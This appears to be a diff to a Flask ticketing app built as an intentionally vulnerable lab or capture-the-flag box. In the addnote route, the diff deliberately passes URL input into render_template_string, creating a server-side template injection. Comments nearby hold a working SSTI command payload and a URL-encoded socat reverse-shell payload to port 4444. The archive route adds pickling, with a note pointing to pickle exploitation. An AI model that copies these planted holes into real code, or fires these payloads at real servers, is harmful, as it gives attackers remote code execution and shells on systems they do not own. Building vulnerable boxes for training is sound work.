@@ -26,6 +26,12 @@ from . import db
 from . import login_manager
 
 
+# TODO: separate out routes
+# ticket routes
+# user routes
+# admin routes
+
+
 @app.route("/home", methods=["GET"])
 @app.route("/index", methods=["GET"])
 @app.route("/", methods=["GET"])
@@ -182,21 +188,14 @@ def posts():
 def create():
     """creates a new post"""
     form = TicketForm()
+    # TODO: rate limiting
     if request.method == "POST":
         if form.validate_on_submit():
-            ticket_number = request.form.get("ticket_number")
             body = request.form.get("body")
-            # TODO: have the system generate ticket number
-            # will simply remote reuqired from form
-            # post ticket
-            # then find latest ticket post and render it
-            # or as soon as page is rendered, create an empty ticket as placeholder
-            # populate field and don't let user change field of ticket number or just render it whereeve
-            # if page is closed, delete ticket
-            post = Post(ticket_number=ticket_number, body=body, attachment=None)
+            post = Post(body=body, attachment=None)
             db.session.add(post)
             db.session.commit()
-            flash("Ticket Added!")
+            flash(f"Ticket #{post.id} Added!")
             return redirect(url_for(".posts"))
         else:
             print(form.errors)
@@ -234,8 +233,11 @@ def attach(id):
                 filepath = os.path.join(app.config["ATTACHMENTS_DIR"], filename)
 
                 # TODO: check if file already exists, or it will overwrite the previous one
-
-                file.save(filepath)
+                if os.path.isfile(filepath):
+                    flash("file already exists")
+                    return redirect(url_for("."))
+                else:
+                    file.save(filepath)
 
                 # update post in the database
                 post = Post.query.get(id)
@@ -251,7 +253,7 @@ def attach(id):
 @login_required
 def archive(id):
     """
-    archives json'd and pickled tickets so we can send them to our
+    archives json'd or pickled tickets so we can send them to our
     monitoring apps
     """
     if request.method == "GET":
@@ -261,14 +263,31 @@ def archive(id):
         # should i json encode it? https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/
         # why would this be done irl
         post = Post.query.get(id)
-        data = base64.urlsafe_b64encode(pickle.dumps(post.body + str(post.id)))
+        # adds id at the end for realism? and making it hard to depickle, but it 
+        # won't work like that I think
+        #         data = base64.urlsafe_b64encode(pickle.dumps(post.body + str(post.id)))
+        # not dumping as an unsafe class just a file
+        #data = base64.urlsafe_b64encode(pickle.dumps(post.body))
+        data = pickle.dumps(post.body)
+
         filename = id + ".pickle"
+        
         filepath = os.path.join(app.config["ATTACHMENTS_DIR"], filename)
         try:
             f = open(filepath, "wb")
             f.write(data)
             f.close()
             flash("Ticket archived!")
+            
+            try:
+                Post.query.filter_by(id=id).delete()
+                db.session.commit()
+
+            except Exception as e:
+                print(e)
+
+            return redirect(url_for(".posts"))
+
         except os.error as e:
             print(e)
             return redirect(url_for(".posts"))
@@ -290,22 +309,24 @@ def restore(id):
     """
     return render_template(url_for(".posts"))
 
-
-@app.route("/addnote/<id>", methods=["GET", "POST"])
+# todo change this route to something that won't be found with gobuster et al
+@app.route("/addnote/<id>/<note>", methods=["GET", "POST"])
 @login_required
-def addnote(id):
-
+def addnote(id, note):
+    """  create a template for this page """
     if not current_user.isadmin:
         # TODO: update this to render a different template?
         print("user not admin")
         flash("you must be admin to do this!")
         return render_template(url_for(".posts"))
-    
+
     if request.method == "GET":
         # TODO: do some sanitization here
-        note = "{{request.application.__globals__.__builtins__.__import__('os').popen('cd ~; ls').read()}}"
+        # note = "{{request.application.__globals__.__builtins__.__import__('os').popen('cd ~; ls').read()}}"
         # TODO: This is SSTI location for www-data shell
         # TODO: add this to db then?
+        # rev shell 
+        # http://127.0.0.1:5000/addnote/1/%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('socat%20exec:%22bash%20-li%22,pty,stderr,setsid,sigint,sane%20tcp:127.0.0.1:4444').read()%7D%7D
         return render_template_string(f"<h1>Added Note to Ticket: {id}<h1><p>{note}")
 
     if request.method == "POST":
